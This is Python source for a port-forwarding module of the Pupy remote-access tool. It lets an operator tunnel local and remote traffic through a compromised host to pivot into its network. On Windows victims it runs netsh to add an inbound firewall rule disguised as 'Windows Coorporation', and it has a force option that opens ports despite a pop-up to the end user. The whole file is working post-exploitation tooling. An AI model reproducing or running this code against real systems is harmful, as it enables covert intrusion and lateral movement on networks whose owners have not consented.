# -*- coding: UTF8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms

from pupylib.PupyModule import *
import StringIO
import SocketServer
import threading
import socket
import logging
import struct
import traceback
import time
import subprocess

__class_name__="PortFwdModule"


class SocketPiper(threading.Thread):
    def __init__(self, read_sock, write_sock):
        threading.Thread.__init__(self)
        self.daemon=True
        self.read_sock=read_sock
        self.write_sock=write_sock
    def run(self):
        try:
            self.read_sock.setblocking(0)
            while True:
                data=""
                try:
                    data+=self.read_sock.recv(1000000)
                    if not data:
                        break
                except Exception as e:
                    if e[0]==9:#errno connection closed
                        break
                    if not data:
                        time.sleep(0.05)
                    continue
                self.write_sock.sendall(data)
        except Exception as e:
            logging.debug("error in socket piper: %s"%str(traceback.format_exc()))
        finally:
            try:
                self.write_sock.shutdown(socket.SHUT_RDWR)
                self.write_sock.close()
            except Exception:
                pass
            try:
                self.read_sock.shutdown(socket.SHUT_RDWR)
                self.read_sock.close()
            except Exception:
                pass
        logging.debug("piper finished")

class LocalPortFwdRequestHandler(SocketServer.BaseRequestHandler):
    def handle(self):
        DST_ADDR, DST_PORT=self.server.remote_address
        logging.debug("forwarding local addr %s to remote %s "%(self.server.server_address, self.server.remote_address))
        rsocket_mod=self.server.rpyc_client.conn.modules.socket
        rsocket=rsocket_mod.socket(rsocket_mod.AF_INET, rsocket_mod.SOCK_STREAM)
        rsocket.settimeout(5)
        try:
            rsocket.connect((DST_ADDR, DST_PORT))
        except Exception as e:
            logging.debug("error: %s"%e)
            if e[0]==10060:
                logging.debug("unreachable !")
            self.request.shutdown(socket.SHUT_RDWR)
            self.request.close()
            return
        logging.debug("connection succeeded !")
        sp1=SocketPiper(self.request, rsocket)
        sp2=SocketPiper(rsocket, self.request)
        sp1.start()
        sp2.start()
        sp1.join()
        sp2.join()
        logging.debug("conn to %s:%s closed"%(DST_ADDR,DST_PORT))

class LocalPortFwdServer(SocketServer.TCPServer):
    allow_reuse_address = True
    def __init__(self, server_address, RequestHandlerClass, bind_and_activate=True, rpyc_client=None, remote_address=None):
        self.rpyc_client=rpyc_client
        self.remote_address=remote_address
        SocketServer.TCPServer.__init__(self, server_address, RequestHandlerClass, bind_and_activate)

class ThreadedLocalPortFwdServer(SocketServer.ThreadingMixIn, LocalPortFwdServer):
    def __str__(self):
        return "<LocalPortForward local=%s remote=%s"%(self.server_address,self.remote_address)

def get_remote_port_fwd_cb(remote_addr, local_addr):
    def func(rsocket):
        logging.debug("forwarding remote addr %s to local %s "%(remote_addr, local_addr))
        lsocket=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        lsocket.settimeout(5)
        try:
            lsocket.connect(local_addr)
        except Exception as e:
            logging.debug("error: %s"%e)
            if e[0]==10060:
                logging.debug("unreachable !")
            rsocket.shutdown(socket.SHUT_RDWR)
            rsocket.close()
            return
        logging.debug("connection succeeded !")
        sp1=SocketPiper(lsocket, rsocket)
        sp2=SocketPiper(rsocket, lsocket)
        sp1.start()
        sp2.start()
        sp1.join()
        sp2.join()
        logging.debug("conn to %s from %s closed"%(local_addr, remote_addr))

    return func

@config(cat="network", tags=["pivot","forward"])
class PortFwdModule(PupyModule):
    """ perform local/remote port forwarding using openssh -L/-R syntax """
    max_clients=1
    unique_instance=True
    daemon=True
    def __init__(self, *args, **kwargs):
        PupyModule.__init__(self, *args, **kwargs)
        self.portfwd_dic={}
        self.current_id=1

    def init_argparse(self):
        self.arg_parser = PupyArgumentParser(prog='portfwd', description=self.__doc__)
        self.arg_parser.add_argument('-L', '--local', help="Local port forward")
        self.arg_parser.add_argument('-R', '--remote', help="Remote port forward")
        self.arg_parser.add_argument('-F', '--force', action='store_true', help="Try to open a port without admin rights (it will prompt a pop up to the end user)")
        self.arg_parser.add_argument('-k', '--kill', type=int, metavar="<id>", help="stop a port forward")

    def stop_daemon(self):
        #TODO
        pass

    def run(self, args):
        if args.local:
            tab=args.local.split(':')
            local_addr="127.0.0.1"
            local_port=None
            remote_addr=None
            remote_port=None

            if len(tab)==3:
                local_port, remote_addr, remote_port = tab
            elif len(tab)==4:
                local_addr, local_port, remote_addr, remote_port = tab
            else:
                self.error("usage: -L [<LOCAL_ADDR>]:<LOCAL_PORT>:<REMOTE_ADDR>:<REMOTE_PORT>")
                return
            try:
                local_port=int(local_port)
                remote_port=int(remote_port)
            except Exception:
                self.error("ports must be integers")
                return
            server = ThreadedLocalPortFwdServer((local_addr, local_port), LocalPortFwdRequestHandler, rpyc_client=self.client, remote_address=(remote_addr, remote_port))
            self.portfwd_dic[self.current_id]=server
            self.current_id+=1
            t=threading.Thread(target=server.serve_forever)
            t.daemon=True
            t.start()
            self.success("LOCAL %s:%s forwarded to REMOTE %s:%s"%(local_addr, local_port, remote_addr, remote_port))
        elif args.remote:
            tab=args.remote.split(':')
            remote_addr="127.0.0.1"
            remote_port=None
            local_addr=None
            local_port=None

            if len(tab)==3:
                remote_port, local_addr, local_port = tab
            elif len(tab)==4:
                remote_addr, remote_port, local_addr, local_port = tab
            else:
                self.error("usage: -R [<REMOTE_ADDR>]:<REMOTE_PORT>:<LOCAL_ADDR>:<LOCAL_PORT>")
                return
            try:
                local_port=int(local_port)
                remote_port=int(remote_port)
            except Exception:
                self.error("ports must be integers")
                return

            if "Windows" in self.client.desc["platform"]:
                self.client.load_package("psutil")
                self.client.load_package("pupwinutils.processes")
                if self.client.conn.modules['pupwinutils.processes'].isUserAdmin() == True:
                    # create new firewall rule
                    cmd = 'netsh advfirewall firewall add rule name="Windows Coorporation" dir=in action=allow protocol=TCP localport=%s' % str(remote_port)
                    output = self.client.conn.modules.subprocess.check_output(cmd.split(), stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
                    if 'ok' in output.lower():
                        self.success("Firewall rule created successfully")
                else:
                    if not args.force:
                        self.error("Firewall modification needs admin rights. Try using -F to force to open a port (it will prompt a pop up to the end user)")
                        return

            self.client.load_package("pupyutils.portfwd")
            remote_server = self.client.conn.modules["pupyutils.portfwd"].ThreadedRemotePortFwdServer((remote_addr, remote_port), callback=get_remote_port_fwd_cb((remote_addr, remote_port),(local_addr, local_port)))
            self.portfwd_dic[self.current_id]=remote_server
            self.current_id+=1
            remote_server.start_serve()
            self.success("REMOTE %s:%s forwarded to LOCAL %s:%s"%(remote_addr, remote_port, local_addr, local_port))

        elif args.kill:
            if args.kill in self.portfwd_dic:
                
                if "Windows" in self.client.desc["platform"]:
                    try:
                        # maybe there is a cleaner way to get the port 
                        tmp = str(self.portfwd_dic[args.kill]).split()
                        port = int(tmp[len(tmp)-1].replace(')', '').replace('>', ''))
                        cmd = 'netsh advfirewall firewall delete rule name="Windows Coorporation" protocol=tcp localport=%s' % str(port)
                        output = self.client.conn.modules.subprocess.check_output(cmd.split(), stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
                        if 'ok' in output.lower():
                            self.success("Firewall rule deleted successfully")
                    except:
                        self.error("Cannot remove the firewall rule")
                
                desc=str(self.portfwd_dic[args.kill])
                self.portfwd_dic[args.kill].shutdown()
                self.portfwd_dic[args.kill].server_close()
                del self.portfwd_dic[args.kill]
                self.success("%s stopped !"%desc)
            else:
                self.error("no such id: %s"%args.kill)
                
        else:
            if not self.portfwd_dic:
                self.error("There are currently no ports forwarded on %s"%self.client)
            else:
                for cid, server in self.portfwd_dic.iteritems():
                    self.success("%s : %s"%(cid, server))


